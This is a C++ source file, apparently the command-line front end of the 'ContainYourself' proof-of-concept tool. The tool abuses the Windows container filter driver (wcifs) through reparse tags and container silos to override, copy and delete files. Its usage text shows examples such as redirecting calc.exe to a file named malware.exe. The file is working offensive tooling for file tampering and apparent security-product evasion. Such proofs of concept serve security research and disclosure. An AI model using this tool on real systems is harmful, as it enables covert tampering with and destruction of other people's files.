#include "../ContainYourself/ContainYourself.h"
#include "Imports.h"

#include <Windows.h>
#include <iostream>
#include <fltUser.h>

#pragma comment (lib, "FltLib.lib")

using std::wstring;
using std::wcout;
using std::endl;

bool IsCmdOptionExists(wchar_t** Begin, wchar_t** End, const wstring& Option) { return std::find(Begin, End, Option) != End; }

wstring GetCmdOption(wchar_t** Begin, wchar_t** End, const wstring& Option)
{
	wchar_t** itr = std::find(Begin, End, Option);
	if (itr != End && ++itr != End)
		return *itr;

	return L"";
}

wstring GetObjectNtName(const wstring& DeviceName)
{
	wchar_t dosDeviceName[50];
	const auto size = QueryDosDeviceW(DeviceName.c_str(), dosDeviceName, sizeof(dosDeviceName));
	return wstring(dosDeviceName, size - sizeof(wchar_t));
}

int wmain(int argc, wchar_t* argv[])
{
	if (IsCmdOptionExists(argv, argv + argc, L"-h") || IsCmdOptionExists(argv, argv + argc, L"/h") || argc <= 1)
	{
		wcout << "ContainYourself POC tool." << endl << endl;
		wcout << "Usage: ContainYourselfPoc.exe [--command]" << endl << endl;
		wcout << "Valid commands:" << endl;
		wcout << "	--set-reparse [override|link] - Set wcifs reparse tag" << endl;
		wcout << "	--remove-reparse [override|link] - Remove wcifs reparse tag" << endl;
		wcout << "	--override-file - override a file using wcifs" << endl;
		wcout << "	--copy-file - Copy a file using wcifs" << endl;
		wcout << "	--delete-file - Delete a file using wcifs" << endl;
		wcout << "Commands arguments:" << endl;
		wcout << "	--source-file  - operation full source file (relative to volume only when using with [--copy-file])" << endl;
		wcout << "	--target-file  - operation target file (relative to volume)" << endl;
		wcout << "	--source-volume  - operation source volume, without a trailing backslash (default is C:)" << endl;
		wcout << "	--target-volume  - operation target volume, without a trailing backslash (default is C:)" << endl << endl;
		wcout << "Examples:" << endl;
		wcout << "	ContainYourselfPoc.exe --set-reparse override --source-file C:\\temp\\calc.exe --target-file \\temp\\malware.exe" << endl;
		wcout << "	ContainYourselfPoc.exe --remove-reparse --source-file C:\\temp\\calc.exe" << endl;
		wcout << "	ContainYourselfPoc.exe --override-file --source-file C:\\temp\\calc.exe" << endl;
		wcout << "	ContainYourselfPoc.exe --copy-file --source-file temp\\document.docx --target-file Documents\\document.docx --target-volume E:" << endl;
		wcout << "	ContainYourselfPoc.exe --delete-file --source-file C:\\temp\\document.docx" << endl;

		return -1;
	}

	auto reparseTagType = GetCmdOption(argv, argv + argc, L"--set-reparse");
	if (!reparseTagType.empty())
	{
		auto reparseTag = 0;
		if (reparseTagType == L"override")
			reparseTag = IS_SERVER_OS ? IO_REPARSE_TAG_WCI : IO_REPARSE_TAG_WCI_1;
		else if (reparseTagType == L"link")
			reparseTag = IS_SERVER_OS ? IO_REPARSE_TAG_WCI_LINK : IO_REPARSE_TAG_WCI_LINK_1;
		else
		{
			wcout << "[-] Invalid reparse tag type. Input should be override|link." << endl;
			return -1;
		}

		const auto sourceFile = GetCmdOption(argv, argv + argc, L"--source-file");
		if (sourceFile.empty())
		{
			wcout << "[-] Missing --source-file." << endl;
			return -1;
		}

		const auto targetFile = GetCmdOption(argv, argv + argc, L"--target-file");
		if (targetFile.empty())
		{
			wcout << "[-] Missing --target-file." << endl;
			return -1;
		}

		try
		{
			ContainYourself::SetWciReparsePoint(sourceFile, targetFile, reparseTag);
		}
		catch (std::exception& e) { cout << e.what() << endl; }
		catch (...) { wcout << L"[-] Unknown error when setting reparse tag" << endl; }

		wcout << L"[+] Done." << endl;
		return 0;
	}

	reparseTagType = GetCmdOption(argv, argv + argc, L"--remove-reparse");
	if (!reparseTagType.empty())
	{
		auto reparseTag = 0;
		if (reparseTagType == L"override")
			reparseTag = IS_SERVER_OS ? IO_REPARSE_TAG_WCI : IO_REPARSE_TAG_WCI_1;
		else if (reparseTagType == L"link")
			reparseTag = IS_SERVER_OS ? IO_REPARSE_TAG_WCI_LINK : IO_REPARSE_TAG_WCI_LINK_1;
		else
		{
			wcout << "[-] Invalid reparse tag type. Input should be override|link." << endl;
			return -1;
		}

		const auto sourceFile = GetCmdOption(argv, argv + argc, L"--source-file");
		if (sourceFile.empty())
		{
			wcout << "[-] Missing --source-file." << endl;
			return -1;
		}

		try
		{
			ContainYourself::RemoveWciReparsePoint(sourceFile, reparseTag);
		}
		catch (std::exception& e) { cout << e.what() << endl; }
		catch (...) { wcout << L"[-] Unknown error when removing reparse tag" << endl; }
	}

	else if (IsCmdOptionExists(argv, argv + argc, L"--override-file"))
	{
		const auto sourceFile = GetCmdOption(argv, argv + argc, L"--source-file");
		if (sourceFile.empty())
		{
			wcout << "[-] Missing --source-file." << endl;
			return -1;
		}

		try
		{
			HANDLE siloHandle = nullptr;
			ContainYourself::InitContainer(GetCurrentProcess(), ContainerUsage::FileOverride, &siloHandle);

			const auto sourceFileHandle = CreateFileW(sourceFile.c_str(),
				GENERIC_READ | GENERIC_WRITE,
				0,
				nullptr,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				nullptr);

			if (INVALID_HANDLE_VALUE == sourceFileHandle)
				wcout << L"[-] CreateFile returned invalid handle." << endl;
		}
		catch (std::exception& e) { cout << e.what() << endl; }
		catch (...) { wcout << L"[-] Unknown error when overriding file" << endl; }

		wcout << L"[+] Done." << endl;
		return 0;
	}

	else if (IsCmdOptionExists(argv, argv + argc, L"--open-link"))
	{
		const auto sourceFile = GetCmdOption(argv, argv + argc, L"--source-file");
		if (sourceFile.empty())
		{
			wcout << "[-] Missing --source-file." << endl;
			return -1;
		}

		try
		{
			HANDLE siloHandle = nullptr;
			ContainYourself::InitContainer(GetCurrentProcess(), ContainerUsage::FileLinking, &siloHandle);

			const auto sourceFileHandle = CreateFileW(sourceFile.c_str(),
				GENERIC_READ | GENERIC_WRITE,
				0,
				nullptr,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				nullptr);

			if (INVALID_HANDLE_VALUE == sourceFileHandle)
				wcout << L"[-] CreateFile returned invalid handle." << endl;
		}
		catch (std::exception& e) { cout << e.what() << endl; }
		catch (...) { wcout << L"[-] Unknown error when overriding file" << endl; }

		wcout << L"[+] Done." << endl;
		return 0;
	}

	else if (IsCmdOptionExists(argv, argv + argc, L"--copy-file"))
	{
		const auto sourceFile = GetCmdOption(argv, argv + argc, L"--source-file");
		if (sourceFile.empty())
		{
			wcout << "[-] Missing --source_file." << endl;
			return -1;
		}

		const auto targetFile = GetCmdOption(argv, argv + argc, L"--target-file");
		if (targetFile.empty())
		{
			wcout << "[-] Missing --target_file." << endl;
			return -1;
		}

		auto sourceVolumeNtName = MAIN_VOLUME_PATH;
		const auto sourceVolume = GetCmdOption(argv, argv + argc, L"--source-volume");
		if (!sourceVolume.empty())
		{
			sourceVolumeNtName = GetObjectNtName(sourceVolume);
		}

		auto targetVolumeNtName = MAIN_VOLUME_PATH;
		const auto targetVolume = GetCmdOption(argv, argv + argc, L"--target-volume");
		if (!targetVolume.empty())
		{
			targetVolumeNtName = GetObjectNtName(targetVolume);
		}

		try
		{
			ContainYourself::CopyFileUsingWcifs(sourceFile, targetFile, sourceVolumeNtName, targetVolumeNtName);
		}
		catch (std::exception& e) { cout << e.what() << endl; }
		catch (...) { wcout << L"[-] Unknown error when overriding file" << endl; }
	}

	else if (IsCmdOptionExists(argv, argv + argc, L"--delete-file"))
	{
		const auto sourceFile = GetCmdOption(argv, argv + argc, L"--source-file");
		if (sourceFile.empty())
		{
			wcout << "[-] Missing --source_file." << endl;
			return -1;
		}

		try
		{
			ContainYourself::SetWciReparsePoint(sourceFile, L"non-existing-file.txt", IO_REPARSE_TAG_WCI_1);

			HANDLE siloHandle = nullptr;
			ContainYourself::InitContainer(GetCurrentProcess(), ContainerUsage::FileOverride, &siloHandle);

			CreateFileW(sourceFile.c_str(),
				GENERIC_READ | GENERIC_WRITE,
				0,
				nullptr,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				nullptr);

		}
		catch (std::exception& e) { cout << e.what() << endl; }
		catch (...) { wcout << L"[-] Unknown error when deleting file" << endl; }
	}

	wcout << L"[+] Done." << endl;
	return 0;
}